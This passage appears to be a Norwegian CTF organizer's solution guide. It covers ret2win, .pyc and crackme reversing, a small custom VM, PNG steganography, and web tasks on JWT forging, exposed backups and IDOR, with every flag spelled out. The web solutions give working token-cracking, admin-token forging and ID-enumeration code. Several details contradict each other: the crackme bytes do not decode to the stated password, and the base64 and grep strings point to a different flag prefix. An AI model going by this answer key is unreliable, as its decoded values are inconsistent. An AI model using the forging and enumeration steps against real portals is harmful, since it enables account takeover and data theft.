- Hvis payloaden krasjer etter hopp til `win()`, legg inn `ret`-gadget før
  `win()` for stack alignment.

**Flagg:** `CTF{buffer_p4_b0den_ret2win}`

<a id="re-01-pyc"></a>

## Python-spionen (`re-01-pyc`)

**Kategori:** Reverse Engineering  
**Poeng:** 150  
**Type:** `.pyc`

**Hva oppgaven tester:** Python bytecode-reversering og enkel XOR.

**Fremgangsmåte:**

1. Start med å se hva filen gjør når den kjøres:

   ```bash
   python3 agent.pyc
   python3 agent.pyc test
   ```

   Programmet forventer én agentkode. Feil kode gir avslag. Man trenger ikke
   kjøre ukjent bytecode for å løse oppgaven, men dette bekrefter formatet.

2. Prøv gjerne dekompilering først:

   ```bash
   pip install decompyle3
   decompyle3 agent.pyc
   ```

   Hvis dekompilatoren ikke støtter bytecode-versjonen, bruk Python sin egen
   disassembler. `.pyc`-filer har en 16-byte header før marshal-kodet code
   object:

   ```python
   import dis
   import marshal
   import types

   with open("agent.pyc", "rb") as f:
       f.read(16)
       code = marshal.loads(f.read())

   def dump(codeobj):
       dis.dis(codeobj)
       for const in codeobj.co_consts:
           if isinstance(const, types.CodeType):
               print("\n--- nested code object ---")
               dump(const)

   dump(code)
   ```

3. I disassemblyen ligger den interessante logikken i `sjekk_agent`.
   Se etter konstanten som lastes inn i `kryptert`:

   ```text
   (0, 10, 48, 59, 50, 40, 20, 57, 120, 61, 120, 57,
    56, 120, 47, 20, 127, 44, 120, 37, 63, 54)
   ```

4. Se deretter på generatoren som bygger `flagg`. Den viktige delen er:

   ```text
   LOAD_GLOBAL chr
   LOAD_FAST b
   LOAD_CONST 75
   BINARY_OP ^
   CALL
   ```

   Dette betyr i vanlig Python:

   ```python
   chr(b ^ 75)
   ```

   `75` desimalt er `0x4B`, altså ASCII `K`.

5. Dekod bytene:

   ```python
   kryptert = [
       8, 31, 13, 48, 59, 50, 40, 20, 57, 120, 61, 120,
       57, 56, 120, 47, 20, 127, 44, 120, 37, 63, 54,
   ]

   flagg = "".join(chr(b ^ 0x4B) for b in kryptert)
   print(flagg)
   ```

   Output:

   ```text
   CTF{pyc_r3v3rs3d_4g3nt}
   ```

6. Hvis man ikke oppdager nøkkelen i bytecoden, er én-byte XOR liten nok til
   å brute forces kontrollert:

   ```python
   kryptert = [
       8, 31, 13, 48, 59, 50, 40, 20, 57, 120, 61, 120,
       57, 56, 120, 47, 20, 127, 44, 120, 37, 63, 54,
   ]

   for key in range(256):
       decoded = "".join(chr(b ^ key) for b in kryptert)
       if decoded.startswith("CTF{") and decoded.endswith("}"):
           print(hex(key), decoded)
   ```

   Output:

   ```text
   0x4b CTF{pyc_r3v3rs3d_4g3nt}
   ```

7. Verifiser funnet mot programmet:

   ```bash
   python3 agent.pyc 'CTF{pyc_r3v3rs3d_4g3nt}'
   ```

   Forventet:

   ```text
   [+] Identitet bekreftet. Velkommen, agent.
   [+] Flagg: CTF{pyc_r3v3rs3d_4g3nt}
   ```

**Kontrollpunkter:**

- Deltakeren trenger ikke å kjøre ukjent kode; statisk disassembly er nok.
- Brute force av én byte er også legitimt hvis man leter etter `CTF{`.
- Byteverdien `75` i disassembly er nøkkelen, ikke en del av flagget.
- Hvis header-hoppet er feil, feiler `marshal.loads`. For denne filen skal man
  hoppe over 16 bytes.

**Flagg:** `CTF{pyc_r3v3rs3d_4g3nt}`

<a id="re-02-crackme"></a>

## Crack meg (`re-02-crackme`)

**Kategori:** Reverse Engineering  
**Poeng:** 350  
**Type:** Linux ELF

**Hva oppgaven tester:** Finne hardkodet passord i en crackme.

**Fremgangsmåte:**

1. Start med grunnleggende triage:

   ```bash
   file crackme
   checksec --file=crackme
   strings -a crackme
   ```

   Binæren er en 64-bit Linux ELF og er strippet, så funksjonsnavn er ikke
   tilgjengelige. `strings` viser likevel programtekstene, blant annet bruk av
   `<passord>`, feil lengde, feil passord og suksessmelding.

2. Test programmet dynamisk:

   ```bash
   ./crackme test
   ./crackme AAAAAAAAAA
   ```

   Første input gir feil lengde, mens ti tegn går videre til passordsjekken.
   Dermed vet man at passordlengden er 10.

3. `strings` avslører også en menneskelesbar streng som skiller seg ut:

   ```text
   N0rdverk!?
   ```

   Dette er en naturlig kandidat fordi den er 10 tegn og passer temaet. Test den:

   ```bash
   ./crackme 'N0rdverk!?'
   ```

4. For å validere at dette ikke bare er flaks, åpne binæren i Ghidra eller se
   `.rodata` med `objdump`:

   ```bash
   objdump -s -j .rodata crackme
   ```

   Rundt slutten av `.rodata` ligger både krypterte flaggbytes og passordarrayet:

   ```text
   4b 6f 6e 67 73 38 65 72 67 21
   ```

5. Konverter disse bytene til ASCII:

   ```text
   N0rdverk!?
   ```

   I disassembly/Ghidra ser man en løkke som sammenligner `argv[1][i]` med
   dette arrayet byte-for-byte. Etter riktig passord XOR-es et annet bytearray
   med passordet for å skrive ut flagget.

6. Kjør programmet med passordet. Det printer flagget.

**Kontrollpunkter:**

- Dette er ikke ment som patching. Naturlig løsning er å lese forventet input
  fra strenger/rodata og bekrefte i Ghidra.
- Siden binæren er strippet, skal writeupen ikke forvente synlige
  funksjonsnavn i release-binæren.

**Passord:** `N0rdverk!?`  
**Flagg:** `CTF{cr4ckm3_r3v3rs3d_ok}`

<a id="re-03-minivm"></a>

## Virtuell maskin (`re-03-minivm`)

**Kategori:** Reverse Engineering  
**Poeng:** 500  
**Type:** Linux ELF

**Hva oppgaven tester:** Statisk analyse av en liten custom VM.

**Fremgangsmåte:**

1. Start med triage:

   ```bash
   file minivm
   strings -a minivm
   ./minivm test
   ```

   Programmet sier at nøkkelen er 12 tegn, og suksessformatet er
   `CTF{%s}`. Binæren er strippet, så deltakeren må analysere kode/data, ikke
   lene seg på symbolnavn.

2. Åpne binæren i Ghidra/IDA. Finn `main` via `__libc_start_main` eller ved å
   følge referanser til strengene `Feil lengde` og `Korrekt nøkkel`.
3. Finn tolkerløkken. Den kjennetegnes av:

   - et instruction pointer-felt som økes
   - en stack med push/pop
   - en `switch`/jump table over små opkoder
   - kasus som gjør `XOR`, `JZ`, `HALT_FAIL` og `HALT_OK`

4. Kartlegg opkodene fra tolkerløkken. Minst disse trengs:

   ```text
   0x01 PUSH imm8
   0x02 LOAD input[idx]
   0x03 XOR
   0x08 HALT_FAIL
   0x09 JZ offset
   0x07 HALT_OK
   ```

5. Finn bytecode-arrayet. I Ghidra kommer det fra datareferansen som sendes inn
   til VM-en. Med terminal kan man se samme data i `.rodata`:

   ```bash
   objdump -s -j .rodata minivm
   ```

   Bytekoden starter med mønsteret:

   ```text
   02 00 01 76 03 09 01 08
   02 01 01 6d 03 09 01 08
   ```

6. Tolk mønsteret som gjentas per tegn:

   ```text
   LOAD input[idx]
   PUSH forventet_byte
   XOR
   JZ +1
   HALT_FAIL
   ```

   Hvis input-tegnet er lik forventet byte, blir XOR-resultatet 0 og VM-en
   hopper over fail.

7. Ekstraher alle bytes som følger etter `PUSH (0x01)` i hvert 8-byte mønster.
   Dette kan gjøres visuelt i Ghidra eller med en liten mønster-parser:

   ```python
   code = bytes.fromhex(
       "0200017603090108"
       "0201016d03090108"
       "0202015f03090108"
       "0203016d03090108"
       "0204013403090108"
       "0205016703090108"
       "0206013103090108"
       "0207016303090108"
       "0208015f03090108"
       "0209016b03090108"
       "020a013303090108"
       "020b017903090108"
       "07"
   )
   key = []
   for i in range(0, 12 * 8, 8):
       assert code[i] == 0x02 and code[i + 2] == 0x01
       key.append(code[i + 3])
   print(bytes(key).decode())
   ```

8. Byteverdiene dekoder til:

   ```text
   vm_m4g1c_k3y
   ```

9. Kjør programmet med nøkkelen for å bekrefte:

   ```bash
   ./minivm vm_m4g1c_k3y
   ```

   Flagget bygges som `CTF{<nøkkel>}`.

**Kontrollpunkter:**

- Deltakeren skal forstå VM-mønsteret, ikke gjette input.
- Bytecode er repetitiv nok til at oppgaven er vanskelig, men kontrollerbar.

**Flagg:** `CTF{vm_m4g1c_k3y}`

<a id="stego-01-plakat-ekko"></a>

## Plakat med ekko (`stego-01-plakat-ekko`)

**Kategori:** Stego  
**Poeng:** 100  
**Type:** PNG

**Hva oppgaven tester:** PNG-metadata og trailing data etter IEND.

**Fremgangsmåte:**

1. Inspiser `plakat.png` uten bildeanalyse først:

   ```bash
   file plakat.png
   pngcheck -vt plakat.png
   exiftool plakat.png
   strings plakat.png | head
   ```

2. Metadata-hintet sier at ekkoet ligger bak rammen og er base64. `pngcheck`
   kan også advare om ekstra data etter `IEND`.
3. PNG-filer slutter ved `IEND`. Finn IEND og sjekk data etterpå:

   ```bash
   binwalk plakat.png
   tail -c 80 plakat.png
   ```

4. Du ser `--ekko--` og en base64-streng.
5. Dekod base64-strengen:

   ```bash
   echo 'S0F7cGxha2F0XzNra18wX2I0a18xZW5kfQ==' | base64 -d
   ```

**Kontrollpunkter:**

- Bildet trenger ikke bildeanalyse.
- Metadata peker mot trailing data, slik at oppgaven ikke blir ren guessing.

**Flagg:** `CTF{plakat_3kk0_b4k_1end}`

<a id="stego-02-lsb-skilt"></a>

## Det blå skiltet (`stego-02-lsb-skilt`)

**Kategori:** Stego  
**Poeng:** 200  
**Type:** PNG

**Hva oppgaven tester:** LSB-steganografi i én fargekanal.

**Fremgangsmåte:**

1. Inspiser `skilt.png` med vanlige stego-førstesteg:

   ```bash
   file skilt.png
   pngcheck -vt skilt.png
   exiftool skilt.png
   strings -a skilt.png | head
   binwalk skilt.png
   ```

   Metadata og trailing data gir ikke flagg. Det peker mot pikselbasert stego.

2. Hintet peker mot blåkanalen. I et GUI-verktøy som StegSolve kan man bla i
   bit planes og se at blå LSB er interessant. Programmatisk leses pikslene rad
   for rad.

3. PNG-en er 8-bit RGB. Hent minst signifikante bit fra blåverdien for hvert
   piksel. De første 32 bitene er big-endian meldingslengde i bytes. Les så
   `lengde * 8` biter, pakk til bytes og dekod som ASCII:

   ```python
   from PIL import Image

   img = Image.open("skilt.png").convert("RGB")
   bits = []
   for y in range(img.height):
       for x in range(img.width):
           r, g, b = img.getpixel((x, y))
           bits.append(b & 1)

   def read_byte(offset):
       value = 0
       for bit in bits[offset:offset + 8]:
           value = (value << 1) | bit
       return value

   length = 0
   for i in range(4):
       length = (length << 8) | read_byte(i * 8)

   msg = bytes(read_byte(32 + i * 8) for i in range(length))
   print(msg.decode())
   ```

4. Meldingen som kommer ut er flagget.

**Kontrollpunkter:**

- Riktig kanal er blå, ikke rød/grønn.
- Første 32-bit lengdefelt gjør at man vet når meldingen stopper.
- Dette kan løses med StegSolve/bit planes, Python/Pillow eller en egen
  LSB-reader. Scriptet over er en generisk ekstraksjon basert på hint og
  lengdefelt, ikke hardkoding av flagget.

**Flagg:** `CTF{lsb_i_bla_kanalen}`

<a id="web-01-jwt"></a>

## Operatørportalen (`web-01-jwt`)

**Kategori:** Web  
**Poeng:** 350  
**Type:** Flask-webapp

**Hva oppgaven tester:** JWT-forging med svakt HS256-secret.

**Fremgangsmåte:**

1. Logg inn som `guest` / `guest`.
2. Inspiser `session_token`-cookien. Payloaden dekoder til noe som:

   ```json
   {"sub":"guest","role":"viewer","iss":"nordverk-portal"}
   ```

3. Tokenet bruker HS256. Det betyr at samme secret brukes til signering og
   verifisering — kjenner du secret-et, kan du selv lage gyldige tokens.

4. **Hent ut tokenet.** Logg inn og les `session_token`-cookien, f.eks. med curl:

   ```bash
   curl -s -i -X POST <URL>/login \
     -d "username=guest&password=guest" | grep -i session_token
   ```

   Lim hele JWT-en (`header.payload.signature`) inn i en fil `token.txt`.

5. **Crack secret-et** mot den medfølgende `wordlist.txt`. Verktøyet prøver
   hvert ord som signeringsnøkkel og stopper når signaturen validerer.

   Med hashcat (modus 16500 = JWT/HS256):

   ```bash
   hashcat -m 16500 token.txt wordlist.txt
   ```

   Eller rent i Python med PyJWT:

   ```python
   import jwt
   token = open("token.txt").read().strip()
   for w in open("wordlist.txt"):
       try:
           jwt.decode(token, w.strip(), algorithms=["HS256"])
           print("Secret funnet:", w.strip()); break
       except jwt.InvalidTokenError:
           pass
   ```

   Riktig secret er `platform` (linje 60 i `wordlist.txt`).

6. **Forge et admin-token.** Samme issuer som originalen, men `role` satt til
   `admin`, signert med det crackede secret-et:

   ```python
   import jwt
   forged = jwt.encode(
       {"sub": "admin", "role": "admin", "iss": "nordverk-portal"},
       "platform",
       algorithm="HS256",
   )
   print(forged)
   ```

7. **Hent flagget.** Send det forged tokenet som `session_token`-cookie til
   `/admin`:

   ```bash
   curl -s <URL>/admin \
     --cookie "session_token=<forged-token>"
   ```

   Responsen inneholder flagget. (I nettleseren: lim tokenet inn som
   `session_token`-cookie via DevTools og naviger til `/admin`.)

**Kontrollpunkter:**

- Å bare endre payload uten å resignere skal gi ugyldig signatur.
- Admin-ruten må sjekke `role=admin`, ikke brukernavnet alene.

**Flagg:** `CTF{jwt_w3ak_s3cr3t_f0rg3d}`

<a id="web-02-backup-lekkasje"></a>

## Backup-lekkasje (`web-02-backup-lekkasje`)

**Kategori:** Web  
**Poeng:** 150  
**Type:** Flask-webapp

**Hva oppgaven tester:** robots.txt og eksponert backupfil.

**Fremgangsmåte:**

1. Besøk `/robots.txt`.
2. Den peker på:

   ```text
   Disallow: /backup/
   ```

3. Test backup-stien. Kataloglisting er deaktivert, men 403-responsen gir en
   liten driftstekst om gamle Flask config-backups.
4. Enumerer filnavn i backup-mappen. Med SecLists kan oppgaven løses
   deterministisk uten ren intuisjon:

   ```bash
   ffuf -u <URL>/backup/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
   ```

   Dette gir treff på `/backup/config.py.bak`. Manuell vei er å kombinere
   nudget om Flask/config-backups med hintet om `.bak`, `.old` og `~`.
5. Hent:

   ```bash
   curl <URL>/backup/config.py.bak
   ```

6. Den gamle konfigurasjonen inneholder `LEGACY_INCIDENT_TOKEN` med flagget.

**Kontrollpunkter:**

- `/backup/` gir 403 med et lite nudge, men `/backup/config.py.bak` skal være
  lesbar.
- `ffuf` med en vanlig SecLists-fil skal finne `config.py.bak`, slik at
  oppgaven ikke avhenger av at deltakeren gjetter Flask-konvensjonen.

**Flagg:** `CTF{r0b0ts_og_b4ckup_fant}`

<a id="web-03-not-your-badge"></a>

## Not Your Badge (`web-03-not-your-badge`)

**Kategori:** Web
**Poeng:** 125
**Type:** Flask-webapp

**Hva oppgaven tester:** Enkel IDOR, der en bruker kan endre en numerisk
objekt-ID i URL-en og lese en ressurs som tilhører noen andre.

**Fremgangsmåte:**

1. Åpne forsiden. Den sier at egen badge-ID er `1000`, og lenken går til:

   ```text
   /badge?id=1000
   ```

2. Legg merke til at ID-en ligger direkte i query-parameteren. Det er ingen
   innlogging eller session-binding som sier at brukeren faktisk eier badge
   `1000`.

3. Test nærliggende badge-ID-er manuelt i nettleseren:

   ```text
   /badge?id=1001
   /badge?id=1002
   ...
   ```

   En deltaker kan også gjøre det med curl, men det er ikke nødvendig:

   ```bash
   for id in $(seq 1000 1010); do
     curl -s "<URL>/badge?id=$id" | grep -E "KA\\{|Badge-ID"
   done
   ```

4. Badge `1007` er en service-/beredskapsbadge. Den viser internmerknaden:

   ```text
   CTF{not_your_badge_1007}
   ```

**Kontrollpunkter:**

- `/badge?id=1000` skal være ufarlig og ikke inneholde flagget.
- `/badge?id=1007` skal vise flagget i HTML-responsen.
- Ugyldig `id` skal gi 400, og ukjent numerisk `id` skal gi 404, slik at
  oppgaven føles som en enkel portal og ikke som magisk skjult tekst.

**Flagg:** `CTF{not_your_badge_1007}`
